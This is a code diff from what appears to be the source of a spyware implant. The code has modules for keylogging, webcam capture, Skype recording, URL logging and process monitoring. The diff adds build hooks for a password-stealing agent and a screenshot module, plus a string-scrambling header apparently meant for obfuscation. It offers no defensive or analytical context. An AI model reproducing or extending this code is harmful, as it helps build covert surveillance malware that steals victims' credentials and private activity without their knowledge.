@@ -52,6 +52,7 @@
 #include <Strsafe.h>
 #include "config.h"
 #include "strings.h"
+#include  <scramblestring.h>
 
 // modules
 #ifdef __ENABLE_KEYLOG_MODULE
@@ -151,10 +152,18 @@ void UnlockConfFile();
 #pragma comment(lib, "webcam")
 #endif
 
+#ifdef __ENABLE_PASSWORD_MODULE
+#pragma comment(lib, "pwdagent")
+#endif
+
 /// Despite the name, procmon monitors i/o access into each process
 #ifdef __ENABLE_PROCMON_MODULE
 #include "../modules/procmon/HM_ProcessMonitors.h"
 #pragma comment(lib, "procmon")
+#endif
+
+#ifdef __ENABLE_SCREENSHOT_MODULE
+#pragma comment(lib, "screenshot")
 #endif
 
 /// SECTION for building modules
@@ -163,7 +172,6 @@ void UnlockConfFile();
 void PM_PrintAgentRegister();
 #include "../modules/imagent/HM_SkypeRecord.h"
 #include "../modules/urlwin32/HM_UrlLog.h" // XXX da modificare 
-#include "HM_Pstorage.h" // XXX da modificare 
 
 void PM_SocialAgentRegister();
 
